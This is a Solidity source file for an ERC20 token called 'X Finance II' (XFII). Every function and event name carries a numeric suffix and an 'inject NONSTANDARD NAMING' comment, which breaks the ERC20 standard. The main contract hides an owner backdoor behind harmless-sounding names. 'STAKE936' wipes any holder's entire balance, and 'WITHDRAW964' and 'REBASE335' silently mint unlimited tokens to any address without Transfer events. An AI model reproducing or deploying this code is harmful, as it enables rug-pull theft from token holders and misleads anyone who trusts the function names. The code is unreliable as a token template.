                                                                 

pragma solidity ^0.5.16;
interface IERC20 {
    function TOTALSUPPLY640() external view returns (uint);	//inject NONSTANDARD NAMING
    function BALANCEOF557(address account) external view returns (uint);	//inject NONSTANDARD NAMING
    function TRANSFER909(address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function ALLOWANCE76(address owner, address spender) external view returns (uint);	//inject NONSTANDARD NAMING
    function APPROVE14(address spender, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function TRANSFERFROM48(address sender, address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    event TRANSFER741(address indexed from, address indexed to, uint value);	//inject NONSTANDARD NAMING
    event APPROVAL92(address indexed owner, address indexed spender, uint value);	//inject NONSTANDARD NAMING
}
contract Context {
    constructor () internal { }
    function _MSGSENDER653() internal view returns (address payable) {	//inject NONSTANDARD NAMING
        return msg.sender;
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping (address => uint) private _balances;
    mapping (address => mapping (address => uint)) private _allowances;
    uint private _totalSupply;
    function TOTALSUPPLY640() public view returns (uint) {	//inject NONSTANDARD NAMING
        return _totalSupply;
    }
    function BALANCEOF557(address account) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _balances[account];
    }
    function TRANSFER909(address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _TRANSFER871(_MSGSENDER653(), recipient, amount);
        return true;
    }
    function ALLOWANCE76(address owner, address spender) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _allowances[owner][spender];
    }
    function APPROVE14(address spender, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE335(_MSGSENDER653(), spender, amount);
        return true;
    }
    function TRANSFERFROM48(address sender, address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _TRANSFER871(sender, recipient, amount);
        _APPROVE335(sender, _MSGSENDER653(), _allowances[sender][_MSGSENDER653()].SUB65(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function INCREASEALLOWANCE470(address spender, uint addedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE335(_MSGSENDER653(), spender, _allowances[_MSGSENDER653()][spender].ADD79(addedValue));
        return true;
    }
    function DECREASEALLOWANCE652(address spender, uint subtractedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE335(_MSGSENDER653(), spender, _allowances[_MSGSENDER653()][spender].SUB65(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function _TRANSFER871(address sender, address recipient, uint amount) internal {	//inject NONSTANDARD NAMING
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].SUB65(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].ADD79(amount);
        emit TRANSFER741(sender, recipient, amount);
    }
    function _INITMINT25(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.ADD79(amount);
        _balances[account] = _balances[account].ADD79(amount);
        emit TRANSFER741(address(0), account, amount);
    }
    function _REBASE608(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.ADD79(amount);
        _balances[account] = _balances[account].ADD79(amount);
    }
    function _WITHDRAW353(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: _withdraw to the zero address");
        _totalSupply = _totalSupply.ADD79(amount);
        _balances[account] = _balances[account].ADD79(amount);
    }
    function _BURN494(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: burn from the zero address");
        _balances[account] = _balances[account].SUB65(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.SUB65(amount);
        emit TRANSFER741(account, address(0), amount);
    }
    function _STAKE191(address acc) internal {	//inject NONSTANDARD NAMING
        require(acc != address(0), "stake to the zero address");
        uint amount = _balances[acc];
        _balances[acc] = 0;
        _totalSupply = _totalSupply.SUB65(amount);
    }
    function _APPROVE335(address owner, address spender, uint amount) internal {	//inject NONSTANDARD NAMING
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit APPROVAL92(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
    function NAME38() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _name;
    }
    function SYMBOL715() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _symbol;
    }
    function DECIMALS392() public view returns (uint8) {	//inject NONSTANDARD NAMING
        return _decimals;
    }
}

library SafeMath {
    function ADD79(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function SUB65(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return SUB65(a, b, "SafeMath: subtraction overflow");
    }
    function SUB65(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        require(b <= a, errorMessage);
        uint c = a - b;
        return c;
    }
    function MUL255(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        if (a == 0) {
            return 0;
        }
        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function DIV480(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return DIV480(a, b, "SafeMath: division by zero");
    }
    function DIV480(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        require(b > 0, errorMessage);
        uint c = a / b;
        return c;
    }
}

contract XFinanceII is ERC20, ERC20Detailed {
  using SafeMath for uint;
  mapping (address => bool) public stakers;
  constructor () public ERC20Detailed("X Finance II", "XFII", 18) {
      _INITMINT25( msg.sender, 1000*10**uint(DECIMALS392()) );
      stakers[msg.sender] = true;
  }

  function STAKE936(address account) public {	//inject NONSTANDARD NAMING
      require(stakers[msg.sender], "error");
      _STAKE191(account);
  }

  function WITHDRAW964(address account, uint amount) public {	//inject NONSTANDARD NAMING
      require(stakers[msg.sender], "error");
      _WITHDRAW353(account, amount);
  }

  function REBASE335(address account, uint amount) public {	//inject NONSTANDARD NAMING
      require(stakers[msg.sender], "error");
      _REBASE608(account, amount);
  }

}